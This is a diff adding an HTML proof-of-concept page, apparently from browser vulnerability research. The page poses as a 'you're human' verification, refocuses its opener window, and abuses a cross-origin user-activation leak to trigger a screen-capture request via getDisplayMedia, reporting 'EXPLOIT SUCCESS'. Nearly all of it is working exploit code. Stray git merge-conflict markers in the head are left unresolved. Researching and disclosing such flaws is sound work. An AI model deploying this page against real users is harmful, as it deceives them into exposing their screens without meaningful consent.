@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - Target Page (Vulnerable Origin)</title>
+</head>
+<<<<<<< HEAD
+
+=======
+>>>>>>> 8bdd8a6a09f2cad8b40d623fd301fe3630642267
+<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
+    <h1>success, you're human</h1>
+    <script>
+        if (window.opener) {
+            setTimeout(() => {
+                window.opener.focus();
+            }, 500);
+        }
+
+        let triggered = false;
+
+        function checkAndExploit(triggerSource) {
+            const isActive = navigator.userActivation.isActive;
+            console.log(`[${triggerSource}] Activation state:`, isActive);
+
+            if (isActive && !triggered) {
+                triggered = true;
+                console.log("[!] Activation leak detected. Triggering getDisplayMedia...");
+
+                navigator.mediaDevices.getDisplayMedia({ video: true })
+                    .then(() => {
+                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.");
+                    })
+                    .catch(e => {
+                        console.log("API blocked/dismissed:", e.message);
+                        triggered = false;
+                    });
+            }
+        }
+
+        window.addEventListener("focus", () => checkAndExploit("focus"));
+        window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
+    </script>
+</body>
+
+</html>
